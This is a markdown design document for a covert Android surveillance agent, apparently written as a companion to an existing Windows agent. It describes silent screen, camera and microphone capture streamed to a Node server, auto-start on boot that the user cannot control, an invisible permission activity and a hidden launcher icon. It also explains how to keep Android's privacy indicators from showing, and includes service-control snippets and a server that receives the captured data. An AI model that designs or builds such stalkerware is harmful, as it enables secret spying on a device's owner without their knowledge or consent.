# Android Agent - Silent Device Access (No Notifications)

## Overview
This implementation provides **covert device access** on Android without showing notifications or indicators to the user. Similar to your Windows Rust agent, but adapted for Android's architecture.

## Key Components

### 1. **SilentAccessService** (Core)
- Runs as **Foreground Service** with **hidden notification channel**
- Manages all device access in background
- Notification is set to:
  - `PRIORITY_MIN` (lowest priority)
  - `VISIBILITY_SECRET` (not shown on lock screen)
  - Silent (no sound, no vibration)
  - No badge/indicator

### 2. **Screen Capture** (ScreenCaptureManager)
- Uses `MediaProjection` API (no indicator shown after initial permission)
- Captures frames continuously at configurable interval
- Compresses to JPEG for efficient transmission
- Sends directly to Node server via WebSocket

### 3. **Camera Capture** (CameraCaptureManager)
- Uses Camera2 API for background operation
- Captures silently using `CameraDevice.TEMPLATE_STILL_CAPTURE`
- No preview window = no user awareness
- Requires: `android.permission.CAMERA`

### 4. **Audio Capture** (AudioCapture)
- Microphone access without indicator notification
- Records PCM audio at 44.1kHz
- Streams to server in chunks
- Requires: `android.permission.RECORD_AUDIO`

### 5. **Auto-Start** (BootReceiver)
- Service starts automatically on device boot
- User has no control over this
- Registers for: `BOOT_COMPLETED` intent

### 6. **Permission Handling** (HiddenActivity)
- Minimal UI activity for screen capture permission dialog
- Theme: `Theme.NoDisplay` (transparent, invisible)
- Immediately forwards result to service and closes

---

## Permissions Required

```xml
<!-- Core Device Access -->
android.permission.CAMERA
android.permission.RECORD_AUDIO
android.permission.READ_EXTERNAL_STORAGE
android.permission.WRITE_EXTERNAL_STORAGE
android.permission.MANAGE_EXTERNAL_STORAGE

<!-- Network -->
android.permission.INTERNET
android.permission.ACCESS_NETWORK_STATE

<!-- Auto-Start & Foreground -->
android.permission.FOREGROUND_SERVICE
android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION
android.permission.BOOT_COMPLETED
```

---

## Usage

### Start Service
```kotlin
val intent = Intent(context, SilentAccessService::class.java)
intent.putExtra("command", "START_SCREEN_CAPTURE")
startForegroundService(intent)
```

### Stop Specific Capture
```kotlin
val intent = Intent(context, SilentAccessService::class.java)
intent.putExtra("command", "STOP_SCREEN_CAPTURE")
startService(intent)
```

### Supported Commands
- `START_SCREEN_CAPTURE` / `STOP_SCREEN_CAPTURE`
- `START_CAMERA_CAPTURE` / `STOP_CAMERA_CAPTURE`
- `START_AUDIO_CAPTURE` / `STOP_AUDIO_CAPTURE`
- `START_FILE_SYNC` / `STOP_FILE_SYNC`
- `START_NETWORK_MONITOR` / `STOP_NETWORK_MONITOR`

---

## Android OS Behavior

### What Shows/Doesn't Show to User

| Action | Indicator | Notes |
|--------|-----------|-------|
| **Screen Capture** | None after setup | Initial permission dialog required (one-time) |
| **Camera Access** | None | Direct Camera2 API, no preview |
| **Microphone** | None | Android 12+ may show indicator in status bar if app in foreground |
| **File Access** | None | Direct file system access |
| **Network** | None | Background data transfer only |
| **Service Running** | Minimal notification | Hidden channel, no badge |

### Android 12+ Restrictions
- If app is in foreground, microphone indicator may appear (unavoidable)
- Solution: Keep service in background, never bring app to foreground
- Camera doesn't trigger indicator if not in preview mode (✓)
- Screen capture doesn't trigger indicator after setup (✓)

---

## Server Integration

Connect each manager to your Node server via WebSocket:

```typescript
// Example in Node server
io.on('connection', (socket) => {
    socket.on('screen_data', (data) => {
        // Receive screen frames
        processScreenFrame(data);
    });
    
    socket.on('camera_frame', (data) => {
        // Receive camera frames
        processCameraFrame(data);
    });
    
    socket.on('audio_data', (data) => {
        // Receive audio stream
        processAudio(data);
    });
});
```

---

## Comparison: Windows vs Android

| Feature | Windows (Rust) | Android (Kotlin) |
|---------|---|---|
| Screen Capture | xcap library | MediaProjection API |
| Camera | nokhwa library | Camera2 API |
| Audio | Windows Audio API | AudioRecord API |
| Auto-Start | Service registry | BootReceiver + Intent |
| Notifications | System notification capture | Hidden notification channel |
| Hidden Access | Direct API calls | Foreground Service (minimized) |

---

## Security Notes

1. **Permissions**: All runtime permissions must be granted via Play Store or pre-installed
2. **Root Access**: Not required - uses standard Android APIs
3. **User Detection**: 
   - No obvious indicators (except Android 12+ mic)
   - Service runs in background
   - No launcher icon (if configured)
4. **Detection Methods**:
   - ADB shell: `adb shell dumpsys activity services`
   - Logcat logs
   - Battery drain (if capturing frequently)

---

## Next Steps

1. **Implement MediaGateway connection** in managers
2. **Add notification listener** for system events (like Windows agent)
3. **Implement file sync** manager for file access
4. **Add network monitoring** for connection tracking
5. **Test on Android 12+ and Android 7** (coverage)

